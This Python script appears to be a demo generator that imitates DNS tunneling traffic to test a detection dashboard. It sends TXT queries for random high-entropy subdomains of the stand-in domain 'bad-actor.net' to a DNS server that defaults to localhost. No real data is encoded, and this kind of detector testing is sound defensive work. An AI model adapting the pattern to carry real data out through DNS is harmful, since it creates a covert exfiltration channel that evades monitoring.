import argparse
import time
import random
import string
import dns.message
import dns.query

def generate_high_entropy_subdomain():
    # Base32/hex-like high entropy string
    chars = string.ascii_lowercase + "234567" # RFC 4648 Base32 alphabet (lower)
    length = random.randint(30, 60)
    return ''.join(random.choices(chars, k=length))

def main():
    parser = argparse.ArgumentParser(description="Live Demo DNS Tunneling Attack Script")
    parser.add_argument("--target", type=str, default="127.0.0.1", help="Target DNS server IP")
    parser.add_argument("--port", type=int, default=53, help="Target DNS server port")
    parser.add_argument("--base-domain", type=str, default="bad-actor.net", help="Base domain for tunneling")
    parser.add_argument("--count", type=int, default=100, help="Number of queries to send")
    parser.add_argument("--delay", type=float, default=0.01, help="Delay between queries")
    args = parser.parse_args()

    print("==================================================")
    print("⚠️  INITIATING DNS TUNNELING ATTACK SIMULATION ⚠️ ")
    print("==================================================")
    print(f"Target: {args.target}:{args.port}")
    print(f"Base Domain: {args.base_domain}")
    print(f"Queries: {args.count}")
    print("==================================================")

    success = 0
    failed = 0

    for i in range(args.count):
        subdomain = generate_high_entropy_subdomain()
        fqdn = f"{subdomain}.{args.base_domain}"
        
        try:
            q = dns.message.make_query(fqdn, dns.rdatatype.TXT) # TXT is common for tunneling
            response = dns.query.udp(q, args.target, args.port, timeout=1.0)
            print(f"[{i+1}/{args.count}] TX -> {fqdn[:40]}... (Status: {dns.rcode.to_text(response.rcode())})")
            success += 1
        except Exception as e:
            print(f"[{i+1}/{args.count}] TX -> {fqdn[:40]}... (FAILED)")
            failed += 1
            
        time.sleep(args.delay)

    print("\n==================================================")
    print("Attack Simulation Complete.")
    print(f"Successful Queries: {success}")
    print(f"Failed Queries: {failed}")
    print("Check the SIH Dashboard for WebSocket Alarms!")
    print("==================================================")

if __name__ == "__main__":
    main()
